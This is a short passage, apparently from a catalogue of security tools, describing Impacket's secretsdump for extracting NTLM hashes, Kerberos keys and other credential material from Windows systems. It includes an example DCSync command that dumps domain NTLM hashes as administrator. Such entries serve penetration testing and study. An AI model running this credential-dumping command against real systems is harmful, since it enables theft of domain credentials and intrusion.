...
name: secretsdump
description: Impacket secretsdump tool that extracts NTLM hashes, Kerberos keys, and
  credential material from Windows systems via NTDS.dit, SAM, and LSA techniques.
...
- description: DCSync with NTLM hash authentication
  command: impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator@10.10.10.1
